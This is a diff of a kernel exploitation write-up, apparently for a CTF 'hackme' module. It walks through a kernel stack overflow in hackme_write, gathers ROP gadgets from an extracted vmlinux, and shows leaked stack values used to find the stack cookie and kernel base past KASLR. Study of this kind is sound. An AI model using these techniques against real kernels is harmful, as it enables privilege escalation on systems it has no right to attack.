@@ -92,11 +92,13 @@ The two important functions are hackme_write and hackme_read.
 The vulnerabilities are trivial we can read and write to kernel stack, the buffer length is 0x80, but if we send more than 0x1000 bytes it will return "Buffer Overflow detected"...., in hackme_write "_copy_from_user" is used and that's the vulnerable function to make the overflow.
 Now let's get the ROP gadgets, we need to extract vmlinux from vmlinux we need to use [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) then we will use ROPgdaget
 
+
     ./extract-vmlinux vmlinuz > vmlinux
     chmod +x vmlinux
     ROPgadget --binary=vmlinux > gadgets.txt
 
 The vmlinux has like **THOUSANDS**  gadgets, i mean is the kernel image so it will run for several minutes, that's why we save them in a file for easy reference.
+
 
 
     ls -lah gadgets.txt 
@@ -181,7 +183,9 @@ As we saw earlier there is kaslr so we need to leak some stuff in this case Kern
     Cycle: 50 Idx: 47 Element: 7ffe7e1201c0
     Cycle: 50 Idx: 48 Element: 246
     Cycle: 50 Idx: 49 Element: 10
+
 We can easily identify the Kernel Stack Cookie in various Position (like idx:16), for kernel base is quite tricky, checking on gdb the address we see that the address at idx: 38 is:
+
 
     Mapped Area 0xffffffffa440a157 = 0xffffffffa4400000 + 0xa157
 
